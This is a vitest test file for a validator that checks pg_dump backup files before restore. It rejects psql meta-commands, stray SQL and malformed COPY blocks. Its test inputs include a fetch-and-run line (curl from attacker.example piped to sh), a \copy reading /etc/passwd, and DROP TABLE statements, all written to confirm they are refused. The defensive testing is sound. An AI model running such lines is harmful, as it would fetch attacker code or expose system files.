import { createHash } from 'node:crypto'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { scanDump } from './dump'
import { PUBLIC_DUMP, PUBLIC_ROWS } from './test-support'

const dir = mkdtempSync(join(tmpdir(), 'backup-dump-test-'))
afterAll(() => rmSync(dir, { recursive: true, force: true }))

let fileCount = 0
function dumpFile(text: string): string {
  const path = join(dir, `dump-${++fileCount}.sql`)
  writeFileSync(path, text)
  return path
}

/** A body between pg_dump's \restrict / \unrestrict pair. */
const wrap = (...lines: string[]): string =>
  ['\\restrict K3y', ...lines, '\\unrestrict K3y', ''].join('\n')

/** The error scanDump rejects with, as text (null when it resolves). */
async function failure(text: string): Promise<string | null> {
  return scanDump(dumpFile(text)).then(
    () => null,
    (caught: unknown) => String(caught),
  )
}

describe('scanDump', () => {
  it('counts the rows of every COPY block, empty blocks included', async () => {
    const scan = await scanDump(dumpFile(PUBLIC_DUMP))
    expect(scan.rows).toEqual(PUBLIC_ROWS)
  })

  it('returns the SHA-256 and size of the file’s bytes', async () => {
    const scan = await scanDump(dumpFile(PUBLIC_DUMP))
    expect(scan.sha256).toBe(createHash('sha256').update(PUBLIC_DUMP).digest('hex'))
    expect(scan.bytes).toBe(Buffer.byteLength(PUBLIC_DUMP))
  })

  it('reads a dump larger than one stream chunk, with a multi-byte character across chunks', async () => {
    const rows = Array.from({ length: 30_000 }, (_, index) => `${index}\tHọc Đều ${'ư'.repeat(7)}`)
    const text = wrap('COPY public.events (id, note) FROM stdin;', ...rows, '\\.')
    const scan = await scanDump(dumpFile(text))
    expect(scan.rows).toEqual({ 'public.events': 30_000 })
    expect(scan.sha256).toBe(createHash('sha256').update(text).digest('hex'))
  })

  it('reads auth tables', async () => {
    const text = wrap(
      'COPY auth.users (id) FROM stdin;',
      'a',
      '\\.',
      'COPY auth.identities (id) FROM stdin;',
      '\\.',
    )
    expect((await scanDump(dumpFile(text))).rows).toEqual({ 'auth.users': 1, 'auth.identities': 0 })
  })

  it('accepts what pg_dump writes outside COPY data: comments, SET, set_config, setval', async () => {
    const text = [
      '--',
      '-- PostgreSQL database dump',
      '--',
      '',
      '\\restrict K3y',
      '-- Dumped by pg_dump version 17.6',
      'SET statement_timeout = 0;',
      'SET transaction_timeout = 0;',
      "SET client_encoding = 'UTF8';",
      'SET standard_conforming_strings = on;',
      "SELECT pg_catalog.set_config('search_path', '', false);",
      'SET row_security = off;',
      'COPY public.ops_metrics (id, key) FROM stdin;',
      '1\tdb.size_bytes',
      '\\.',
      "SELECT pg_catalog.setval('public.ops_metrics_id_seq', 802, true);",
      '--',
      '-- PostgreSQL database dump complete',
      '--',
      '',
      '\\unrestrict K3y',
      '',
      '',
    ].join('\n')
    expect((await scanDump(dumpFile(text))).rows).toEqual({ 'public.ops_metrics': 1 })
  })

  it('rejects a psql meta-command outside COPY data, without echoing it', async () => {
    const error = await failure(wrap('SET x = 1;', '\\! curl https://attacker.example/x | sh'))
    expect(error).toMatch(/line 3\b.*backslash outside COPY data/)
    expect(error).not.toContain('attacker')
  })

  it('rejects a backslash in the middle of a line (a meta-command after a statement)', async () => {
    const error = await failure(wrap('SET statement_timeout = 0; \\! id'))
    expect(error).toMatch(/line 2\b.*backslash outside COPY data/)
  })

  it('rejects a backslash even inside a comment line', async () => {
    expect(await failure(wrap('-- a comment \\! id'))).toMatch(/line 2\b.*backslash/)
  })

  it.each([
    ['\\connect', '\\connect other'],
    ['\\copy', "\\copy public.profiles from '/etc/passwd'"],
    ['a second \\restrict', '\\restrict Other'],
    ['an early \\unrestrict', '\\unrestrict K3y'],
  ])('rejects %s between the \\restrict pair', async (_label, line) => {
    expect(await failure(wrap('SET x = 1;', line, 'SET y = 2;'))).toMatch(/line 3\b/)
  })

  it('requires \\restrict <key> as the first statement', async () => {
    const noRestrict = ['SET x = 1;', 'COPY public.events (id) FROM stdin;', '\\.', ''].join('\n')
    expect(await failure(noRestrict)).toMatch(/line 1\b.*\\restrict/)
    expect(await failure(`SET x = 1;\n${wrap()}`)).toMatch(/line 1\b.*\\restrict/)
    expect(await failure(wrap().replace('\\restrict K3y', '\\restrict'))).toMatch(/\\restrict/)
  })

  it('requires \\unrestrict with the same key as the last statement', async () => {
    const truncated = ['\\restrict K3y', 'COPY public.events (id) FROM stdin;', '\\.', ''].join(
      '\n',
    )
    expect(await failure(truncated)).toMatch(/does not end with \\unrestrict/)
    expect(await failure(wrap().replace('\\unrestrict K3y', '\\unrestrict Other'))).toMatch(
      /line 2\b.*key/,
    )
    expect(await failure(`${wrap()}SET x = 1;\n`)).toMatch(/line 3\b.*after \\unrestrict/)
  })

  it.each([
    ['a DROP', 'DROP TABLE public.profiles;'],
    ['a function', 'CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ select 1 $$;'],
    ['an INSERT', "INSERT INTO public.profiles (id) VALUES ('x');"],
    ['a SET with more after it', 'SET x = 1; DROP TABLE public.profiles;'],
    ['a SELECT other than set_config and setval', 'SELECT pg_catalog.pg_sleep(1);'],
  ])('rejects any other statement outside COPY data: %s', async (_label, line) => {
    expect(await failure(wrap(line))).toMatch(/line 2\b.*not something pg_dump writes/)
  })

  it('rejects a COPY block that never ends (a truncated dump)', async () => {
    const text = ['\\restrict K3y', 'COPY public.events (id) FROM stdin;', '1', '2', ''].join('\n')
    expect(await failure(text)).toMatch(/public\.events.*never ends/)
  })

  it('rejects a table copied twice', async () => {
    const block = ['COPY public.events (id) FROM stdin;', '1', '\\.']
    expect(await failure(wrap(...block, ...block))).toMatch(/public\.events.*twice/)
  })

  it.each([
    ['a quoted identifier', 'COPY public."Events" (id) FROM stdin;'],
    ['a table without a schema', 'COPY events (id) FROM stdin;'],
    ['COPY from a file', "COPY public.events (id) FROM '/tmp/x';"],
  ])('rejects a COPY statement it does not recognise: %s', async (_label, line) => {
    expect(await failure(wrap(line, '\\.'))).toMatch(/line 2\b.*COPY/)
  })

  it('rejects a missing file', async () => {
    await expect(scanDump(join(dir, 'missing.sql'))).rejects.toThrow()
  })
})
